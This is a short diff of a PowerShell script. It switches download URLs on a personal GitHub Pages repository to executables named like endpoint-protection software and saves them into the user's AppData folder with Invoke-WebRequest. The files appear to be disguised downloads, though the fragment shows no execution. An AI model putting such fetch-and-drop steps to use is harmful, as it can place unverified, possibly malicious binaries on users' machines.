@@ -1,7 +1,7 @@
-$serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceasservice.exe"
-$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceas.exe"
-$servicePath = "$env:USERPROFILE\AppData\Local\ceasservice.exe"
-$popupPath = "$env:USERPROFILE\AppData\Local\ceas.exe"
+$serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVService.exe"
+$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVEndpointProtection.exe"
+$servicePath = "$env:USERPROFILE\AppData\Local\RAVService.exe"
+$popupPath = "$env:USERPROFILE\AppData\Local\RAVPopup.exe"
 
 Invoke-WebRequest -Uri $serviceURL -OutFile $servicePath
 
